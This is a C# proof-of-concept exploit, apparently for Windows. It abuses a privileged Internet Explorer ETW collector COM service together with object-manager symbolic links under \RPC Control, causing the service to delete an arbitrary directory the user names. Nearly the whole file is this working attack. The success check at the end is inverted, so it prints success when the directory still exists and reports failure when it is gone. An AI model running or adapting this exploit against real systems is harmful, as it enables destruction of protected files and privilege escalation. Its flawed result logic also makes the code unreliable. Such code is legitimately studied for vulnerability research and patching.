using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace NS
{
    class Program
    {
        [Flags]
        public enum AttributeFlags : uint
        {
            None = 0,
            Inherit = 0x00000002,
            Permanent = 0x00000010,
            Exclusive = 0x00000020,
            CaseInsensitive = 0x00000040,
            OpenIf = 0x00000080,
            OpenLink = 0x00000100,
            KernelHandle = 0x00000200,
            ForceAccessCheck = 0x00000400,
            IgnoreImpersonatedDevicemap = 0x00000800,
            DontReparse = 0x00001000,
        }
        
        [Flags]
        public enum GenericAccessRights : uint
        {
            None = 0,
            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            MaximumAllowed = 0x02000000,
        };


        [Flags]
        enum DirectoryAccessRights : uint
        {
            Query = 1,
            Traverse = 2,
            CreateObject = 4,
            CreateSubDirectory = 8,
            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            Delete = 0x00010000,
            ReadControl = 0x00020000,
            WriteDac = 0x00040000,
            WriteOwner = 0x00080000,
            Synchronize = 0x00100000,
            MaximumAllowed = 0x02000000,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public sealed class UnicodeString
        {
            ushort Length;
            ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            string Buffer;

            public UnicodeString(string str)
            {
                Length = (ushort)(str.Length * 2);
                MaximumLength = (ushort)((str.Length * 2) + 1);
                Buffer = str;
            }
        }

        [DllImport("ntdll.dll")]
        static extern int NtClose(IntPtr handle);

        public sealed class SafeKernelObjectHandle
          : SafeHandleZeroOrMinusOneIsInvalid
        {
            public SafeKernelObjectHandle()
              : base(true)
            {
            }

            public SafeKernelObjectHandle(IntPtr handle, bool owns_handle)
              : base(owns_handle)
            {
                SetHandle(handle);
            }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    NtClose(this.handle);
                    this.handle = IntPtr.Zero;
                    return true;
                }
                return false;
            }
        }

        public enum SecurityImpersonationLevel
        {
            Anonymous = 0,
            Identification = 1,
            Impersonation = 2,
            Delegation = 3
        }

        public enum SecurityContextTrackingMode : byte
        {
            Static = 0,
            Dynamic = 1
        }

        [StructLayout(LayoutKind.Sequential)]
        public sealed class SecurityQualityOfService
        {
            int Length;
            public SecurityImpersonationLevel ImpersonationLevel;
            public SecurityContextTrackingMode ContextTrackingMode;
            [MarshalAs(UnmanagedType.U1)]
            public bool EffectiveOnly;

            public SecurityQualityOfService()
            {
                Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public sealed class ObjectAttributes : IDisposable
        {
            int Length;
            IntPtr RootDirectory;
            IntPtr ObjectName;
            AttributeFlags Attributes;
            IntPtr SecurityDescriptor;
            IntPtr SecurityQualityOfService;

            private static IntPtr AllocStruct(object s)
            {
                int size = Marshal.SizeOf(s);
                IntPtr ret = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(s, ret, false);
                return ret;
            }

            private static void FreeStruct(ref IntPtr p, Type struct_type)
            {
                Marshal.DestroyStructure(p, struct_type);
                Marshal.FreeHGlobal(p);
                p = IntPtr.Zero;
            }

            public ObjectAttributes() : this(AttributeFlags.None)
            {
            }

            public ObjectAttributes(string object_name, AttributeFlags attributes) : this(object_name, attributes, null, null, null)
            {
            }

            public ObjectAttributes(AttributeFlags attributes) : this(null, attributes, null, null, null)
            {
            }

            public ObjectAttributes(string object_name) : this(object_name, AttributeFlags.CaseInsensitive, null, null, null)
            {
            }

            public ObjectAttributes(string object_name, AttributeFlags attributes, SafeKernelObjectHandle root, SecurityQualityOfService sqos, GenericSecurityDescriptor security_descriptor)
            {
                Length = Marshal.SizeOf(this);
                if (object_name != null)
                {
                    ObjectName = AllocStruct(new UnicodeString(object_name));
                }
                Attributes = attributes;
                if (sqos != null)
                {
                    SecurityQualityOfService = AllocStruct(sqos);
                }
                if (root != null)
                    RootDirectory = root.DangerousGetHandle();
                if (security_descriptor != null)
                {
                    byte[] sd_binary = new byte[security_descriptor.BinaryLength];
                    security_descriptor.GetBinaryForm(sd_binary, 0);
                    SecurityDescriptor = Marshal.AllocHGlobal(sd_binary.Length);
                    Marshal.Copy(sd_binary, 0, SecurityDescriptor, sd_binary.Length);
                }
            }

            public void Dispose()
            {
                if (ObjectName != IntPtr.Zero)
                {
                    FreeStruct(ref ObjectName, typeof(UnicodeString));
                }
                if (SecurityQualityOfService != IntPtr.Zero)
                {
                    FreeStruct(ref SecurityQualityOfService, typeof(SecurityQualityOfService));
                }
                if (SecurityDescriptor != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(SecurityDescriptor);
                    SecurityDescriptor = IntPtr.Zero;
                }
                GC.SuppressFinalize(this);
            }

            ~ObjectAttributes()
            {
                Dispose();
            }
        }
        
        public static void StatusToNtException(int status)
        {
            if (status < 0)
            {
                throw new NtException(status);
            }
        }

        public class NtException : ExternalException
        {
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string modulename);

            [Flags]
            enum FormatFlags
            {
                AllocateBuffer = 0x00000100,
                FromHModule = 0x00000800,
                FromSystem = 0x00001000,
                IgnoreInserts = 0x00000200
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern int FormatMessage(
              FormatFlags dwFlags,
              IntPtr lpSource,
              int dwMessageId,
              int dwLanguageId,
              out IntPtr lpBuffer,
              int nSize,
              IntPtr Arguments
            );

            [DllImport("kernel32.dll")]
            private static extern IntPtr LocalFree(IntPtr p);

            private static string StatusToString(int status)
            {
                IntPtr buffer = IntPtr.Zero;
                try
                {
                    if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
                        GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
                    {
                        return Marshal.PtrToStringUni(buffer);
                    }
                }
                finally
                {
                    if (buffer != IntPtr.Zero)
                    {
                        LocalFree(buffer);
                    }
                }
                return String.Format("Unknown Error: 0x{0:X08}", status);
            }

            public NtException(int status) : base(StatusToString(status))
            {
            }
        }
        
        [DllImport("ntdll.dll")]
        static extern int NtCreateDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);

        [DllImport("ntdll.dll")]
        static extern int NtOpenDirectoryObject(out IntPtr Handle, DirectoryAccessRights DesiredAccess, ObjectAttributes ObjectAttributes);
        
        static SafeKernelObjectHandle CreateDirectory(SafeKernelObjectHandle root, string path)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive, root, null, null))
            {
                IntPtr handle;
                StatusToNtException(NtCreateDirectoryObject(out handle, DirectoryAccessRights.GenericAll, obja));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        static SafeKernelObjectHandle OpenDirectory(string path)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive))
            {
                IntPtr handle;
                StatusToNtException(NtOpenDirectoryObject(out handle, DirectoryAccessRights.MaximumAllowed, obja));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        [DllImport("ntdll.dll")]
        static extern int NtCreateSymbolicLinkObject(
            out IntPtr LinkHandle,
            GenericAccessRights DesiredAccess,
            ObjectAttributes ObjectAttributes,
            UnicodeString DestinationName
        );

        static SafeKernelObjectHandle CreateSymbolicLink(SafeKernelObjectHandle directory, string path, string target)
        {
            using (ObjectAttributes obja = new ObjectAttributes(path, AttributeFlags.CaseInsensitive, directory, null, null))
            {
                IntPtr handle;
                StatusToNtException(NtCreateSymbolicLinkObject(out handle, GenericAccessRights.MaximumAllowed, obja, new UnicodeString(target)));
                return new SafeKernelObjectHandle(handle, true);
            }
        }

        static List<SafeKernelObjectHandle> CreateChainForPath(SafeKernelObjectHandle root, string path)
        {
            string[] parts = path.Split('\\');
            List<SafeKernelObjectHandle> ret = new List<SafeKernelObjectHandle>();
            ret.Add(root);
            foreach (string part in parts)
            {
                ret.Add(CreateDirectory(ret.Last(), part));
            }

            return ret;
        }

        [DllImport("ole32.dll")]
        static extern int CoInitializeSecurity(
            IntPtr pSecDesc,
            int cAuthSvc,
            IntPtr asAuthSvc,
            IntPtr pReserved1,
            int dwAuthnLevel,
            int dwImpLevel,
            IntPtr pAuthList,
            int dwCapabilities,
            IntPtr pReserved3
        );

        /* Memory Size: 56 */
        [StructLayout(LayoutKind.Sequential)]
        struct CreateCollectionSessionRequestData
        {
            /* Offset: 0 */
            public IntPtr AgentName;
            /* Offset: 8 */
            public Guid AgentClsid;
            /* Offset: 24 */
            public IntPtr LogName;
            /* Offset: 32 */
            public Guid LogGuid;
            /* Offset: 48 */
            public short Member4;
        };

        /* Memory Size: 16 */
        [StructLayout(LayoutKind.Sequential)]
        struct CreateCollectionSessionReplyData
        {
            /* Offset: 0 */
            public long Member0;
            /* Offset: 8 */
            public long Member1;
        };

        /* Memory Size: 16 */
        [StructLayout(LayoutKind.Sequential)]
        struct Struct_0
        {
            /* Offset: 0 */
            public IntPtr Member0;
            /* Offset: 8 */
            public int Member1;
        };

        [ComImport, Guid("72e78ac2-a1ff-4c6e-be0b-2ca619b2b59b"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IIEEtwCollector
        {
            void CreateCollectionSession(
                /* Stack Offset: 8 */ [In] IIEEtwCollectorHost p0,
                /* Stack Offset: 16 */ [In] ref CreateCollectionSessionRequestData p1,
                /* Stack Offset: 24 */ [Out] out IIEEtwCollectorSession p2, /* Stack Offset: 32 */ out CreateCollectionSessionReplyData p3);
        }

        [Guid("f74b1266-ff39-4b62-8b6b-29c09920852c"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown), ComImport]
        interface IIEEtwCollectorHost
        {
            void Proc3(/* Stack Offset: 8 */ [In] ref Guid p0, /* Stack Offset: 16 */ [In] ref Struct_0 p1);
            void Proc4(/* Stack Offset: 8 */ [In] ref Guid p0, /* Stack Offset: 16 */ [In] [MarshalAs(UnmanagedType.LPWStr)] string p1);
        }

        [Guid("ab8ee4b6-26ec-42d4-a7fc-06b4fb10e67a"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown), ComImport]
        interface IIEEtwCollectorSession
        {
            void Proc3(/* Stack Offset: 8 */ [In] int p0, /* Stack Offset: 16 */ [In] /* enum */ short p1);
            void Proc4();
            void Proc5(/* Stack Offset: 8 */ [Out] [MarshalAs(UnmanagedType.BStr)] out string p0);
            void Proc6(/* Stack Offset: 8 */ [In] ref Guid p0, /* Stack Offset: 16 */ [In] ref Guid p1, /* Stack Offset: 24 */ [Out] /* iid_is param offset: 16 */ [MarshalAs(UnmanagedType.IUnknown)] out object p2);
            void Proc7();///* Stack Offset: 8 */ [In] struct Struct_2[]* p0, /* Stack Offset: 16 */ [In] int p1, /* Stack Offset: 24 */ [In, Out] struct Struct_3[]* p2);
        }

        [ComVisible(true)]
        class Host : IIEEtwCollectorHost
        {
            public void Proc3([In] ref Guid p0, [In] ref Struct_0 p1)
            {
                throw new NotImplementedException();
            }

            public void Proc4([In] ref Guid p0, [In, MarshalAs(UnmanagedType.LPWStr)] string p1)
            {
                throw new NotImplementedException();
            }
        }

        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 1)
                {
                    Console.WriteLine("Usage: dir_to_delete");
                }

                string dir_to_delete = Path.GetFullPath(args[0]);
                if (!Directory.Exists(dir_to_delete))
                {
                    throw new Exception(String.Format("Directory {0} doesn't exist", dir_to_delete));
                }

                int hr = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero,
                        0, 3, IntPtr.Zero, 0, IntPtr.Zero);
                if (hr != 0)
                {
                    Marshal.ThrowExceptionForHR(hr);
                }
                
                Type t = Type.GetTypeFromCLSID(new Guid("6CF9B800-50DB-46B5-9218-EACF07F5E414"));
                IIEEtwCollector collector = (IIEEtwCollector)Activator.CreateInstance(t);
                
                var dirs = CreateChainForPath(OpenDirectory(@"\??"), @"GLOBALROOT\RPC Control");
                SafeKernelObjectHandle symlink = CreateSymbolicLink(dirs.Last(), @"xyz", @"\??\" + Path.GetTempPath());

                try
                {
                    Directory.Delete(Path.GetTempPath() + Guid.Empty.ToString());
                }
                catch (IOException)
                {
                }

                CreateCollectionSessionRequestData request = new CreateCollectionSessionRequestData();
                request.LogName = Marshal.StringToBSTR(@"\\?\GLOBALROOT\RPC Control\xyz");

                var dirs2 = CreateChainForPath(OpenDirectory(@"\RPC Control"), "xyz");
                var symlink2 = CreateSymbolicLink(dirs2.Last(), Guid.Empty.ToString(), @"\??\" + dir_to_delete);

                request.LogGuid = Guid.Empty;
                request.AgentName = Marshal.StringToBSTR("abc.dll");
                request.AgentClsid = Guid.Empty;
                IIEEtwCollectorSession session;
                CreateCollectionSessionReplyData reply;
                
                try
                {
                    Console.WriteLine("Attemping to delete {0}", dir_to_delete);
                    collector.CreateCollectionSession(new Host(), ref request, out session, out reply);
                }
                catch (Exception)
                {
                }

                if (!Directory.Exists(dir_to_delete))
                {
                    throw new Exception(String.Format("Deleting directory {0} failed", dir_to_delete));
                }

                Console.WriteLine("[SUCCESS]: Deleted target directory");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR]: {0}", ex.Message);
            }
        }
    }
}
